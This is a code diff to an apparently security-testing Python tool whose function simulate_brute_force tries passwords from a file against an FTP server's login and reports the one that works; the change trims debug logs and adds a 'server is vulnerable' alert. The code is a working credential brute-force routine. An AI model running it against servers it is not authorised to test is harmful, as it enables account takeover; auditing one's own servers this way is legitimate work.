@@ -95,16 +95,15 @@ def simulate_brute_force(target: str, delay: str, username: str, password_file: 
         start_time = time.time()
         for attempt, password in enumerate(passwords, start=1):
             password = password.strip()
-            logging.debug(f"Trying password: {password}")  # Debug log
             try:
                 with ftplib.FTP(target) as ftp:
                     ftp.login(user=username, passwd=password)
                     sys.stdout.write("\n")
                     logging.info(Fore.RED + f"Successful login with password: {Style.BRIGHT}{Fore.RED}{password}{Style.RESET_ALL} | {Fore.BLUE} Total attempts: {attempt} | Elapsed time: {time.time() - start_time:.1f} seconds")
+                    logging.critical(Fore.RED + Style.BRIGHT + "The Server is VULNERABLE to Brute Force Attack!")
                     return password
             except ftplib.error_perm as e:
-                logging.debug(f"Failed login with password: {password} | Error: {e}")  # Debug log
-                sys.stdout.write(Fore.BLUE + f"\rCurrent Login attempts: {attempt}..")
+                sys.stdout.write(Fore.BLUE + f"\rFailed Login attempts: {attempt}..")
                 sys.stdout.flush()
             except ftplib.error_temp as e:
                 logging.warning(Fore.GREEN + f"Temporary error on attempt: {attempt} | {e}")
